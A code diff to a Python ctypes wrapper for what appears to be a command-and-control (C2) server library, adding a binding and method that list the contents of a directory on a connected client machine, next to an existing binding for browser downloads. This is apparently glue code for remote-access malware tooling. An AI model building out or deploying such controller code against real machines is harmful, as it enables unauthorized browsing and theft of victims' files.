@@ -69,6 +69,10 @@ class C2Wrapper:
         # char* browser_downloads_handle(sock_t client_fd)
         self.lib.browser_downloads_handle.argtypes = [c_int]
         self.lib.browser_downloads_handle.restype = c_void_p
+
+        # char* browse_dir_handle(sock_t client_fd, char* dir)
+        self.lib.browse_dir_handle.argtypes = [c_int, c_char_p]
+        self.lib.browse_dir_handle.restype = c_void_p
     
     def _free_cstring(self, ptr: int):
         """Free memory allocated by C code"""
@@ -233,3 +237,23 @@ class C2Wrapper:
             remote_bytes,
             local_bytes
         )
+
+    def get_content_from_dir(self, remote_path: str):
+        """
+        Get directory content from a directory
+        
+        Args:
+            remote_path: Path on client machine
+        """
+        remote_bytes = remote_path.encode('utf-8')
+        ptr = self.lib.browse_dir_handle(
+            self.client_fd,
+            remote_bytes
+        )
+        if not ptr:
+            return ""
+        
+        # Convert C string to Python string
+        result = ctypes.string_at(ptr).decode('utf-8', errors='replace')
+        self._free_cstring(ptr)
+        return result
